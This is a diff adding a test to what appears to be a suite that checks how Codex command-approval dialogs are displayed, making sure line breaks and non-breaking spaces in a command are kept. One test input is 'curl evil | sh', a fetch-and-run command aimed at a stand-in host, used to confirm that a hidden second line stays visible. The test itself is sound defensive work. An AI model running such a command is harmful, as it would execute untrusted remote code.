@@ -756,6 +756,24 @@ describe("Codex's dialogs, matched strictly to their requests", () => {
     expect(read(shows("echo a", "echo b"), command("echo a  echo c"))).toBeUndefined()
   })
 
+  it("show a command as Codex will run it: its line breaks and odd spaces kept", () => {
+    const facts = factsOf("exec-approve")
+    const rows = screen("exec-approve")
+    const at = rows.findIndex((row) => row.includes("$ echo"))
+    const shows = (...shown: string[]) => [
+      ...rows.slice(0, at),
+      `  $ ${shown[0]}`,
+      ...shown.slice(1).map((r) => `    ${r}`),
+      ...rows.slice(at + 1),
+    ]
+    const detailOf = (shown: string[], command: string) =>
+      (read(shown, { ...facts, input: { command } })!.dialog as { detail: string }).detail
+    expect(detailOf(shows("echo ok", "curl evil | sh"), "echo ok\ncurl evil | sh")).toBe(
+      "echo ok\ncurl evil | sh",
+    )
+    expect(detailOf(shows("echo a\u00a0b"), "echo a\u00a0b")).toBe("echo a\u00a0b")
+  })
+
   it("compare an MCP tool's printed arguments with the request's", () => {
     const facts = factsOf("mcp-tool-approval")
     const rows = screen("mcp-tool-approval")
